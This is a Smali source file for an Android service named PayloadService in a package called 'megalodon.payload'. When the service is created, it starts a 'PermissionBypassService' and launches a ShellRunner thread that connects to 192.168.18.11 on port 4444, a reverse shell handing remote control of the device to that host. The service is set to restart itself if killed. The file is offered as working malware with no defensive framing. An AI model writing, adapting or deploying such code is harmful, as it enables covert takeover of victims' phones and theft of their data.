.class public Lcom/megalodon/payload/PayloadService;
.super Landroid/app/Service;
.source "PayloadService.smali"

.field private static final TAG:Ljava/lang/String; = "Megalodon"
.field private thread:Ljava/lang/Thread;
.field private bypassService:Landroid/content/Intent;

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/app/Service;-><init>()V
    return-void
.end method

.method public onCreate()V
    .registers 4
    const-string v0, "Megalodon"
    const-string v1, "Payload service created"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {p0}, Lcom/megalodon/payload/PayloadService;->startBypassService()V

    new-instance v0, Lcom/megalodon/payload/ShellRunner;
    const-string v1, "192.168.18.11"
    const/16 v2, 0x115c
    invoke-direct {v0, v1, v2}, Lcom/megalodon/payload/ShellRunner;-><init>(Ljava/lang/String;I)V

    new-instance v1, Ljava/lang/Thread;
    invoke-direct {v1, v0}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    iput-object v1, p0, Lcom/megalodon/payload/PayloadService;->thread:Ljava/lang/Thread;

    iget-object v0, p0, Lcom/megalodon/payload/PayloadService;->thread:Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V
    return-void
.end method

.method public startBypassService()V
    .registers 3
    const-string v0, "Megalodon"
    const-string v1, "Starting permission bypass service"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    
    new-instance v0, Landroid/content/Intent;
    const-class v1, Lcom/megalodon/payload/PermissionBypassService;
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    iput-object v0, p0, Lcom/megalodon/payload/PayloadService;->bypassService:Landroid/content/Intent;
    
    iget-object v0, p0, Lcom/megalodon/payload/PayloadService;->bypassService:Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lcom/megalodon/payload/PayloadService;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .registers 4
    const-string v0, "Megalodon"
    const-string v1, "Payload service started"
    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    const/4 v0, 0x1
    return v0
.end method

.method public onDestroy()V
    .registers 2
    iget-object v0, p0, Lcom/megalodon/payload/PayloadService;->thread:Ljava/lang/Thread;
    if-eqz v0, :cond_8
    iget-object v0, p0, Lcom/megalodon/payload/PayloadService;->thread:Ljava/lang/Thread;
    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V
    :cond_8
    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method
.end class
